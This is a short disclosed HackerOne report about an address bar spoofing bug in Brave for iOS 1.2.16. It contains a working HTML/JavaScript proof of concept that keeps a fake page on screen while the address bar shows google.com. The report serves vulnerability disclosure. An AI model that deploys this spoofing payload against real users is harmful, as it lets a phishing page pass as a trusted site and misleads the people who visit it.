# [ios] Address bar spoofing in Brave for iOS

## Report Details
- **Report ID**: 176929
- **URL**: https://hackerone.com/reports/176929
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-10-20T00:40:35.997Z
- **Disclosed**: 2016-10-25T21:40:42.621Z

## Reporter
- **Username**: ibram
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
Hey

## Summary:
I've found an address bar spoofing vulnerability in the latest version of Brave for iOS.

## Products affected: 
Brave for iOS 1.2.16

*(Android maybe?)*

## PoC:
```html
<script>
  var spoof = function(){
      document.write("<h1>This is not Google</h1>");
      document.location = "https://google.com:1234";
      setInterval(function(){document.location="https://google.com:1234";},9800);
  };
</script>

<input type="button" value="Spoof" onclick="spoof();" />
```

## Supporting Material/References:
{F128949}

Regards,
Ibram

## Attachments
- IMG_3820.PNG
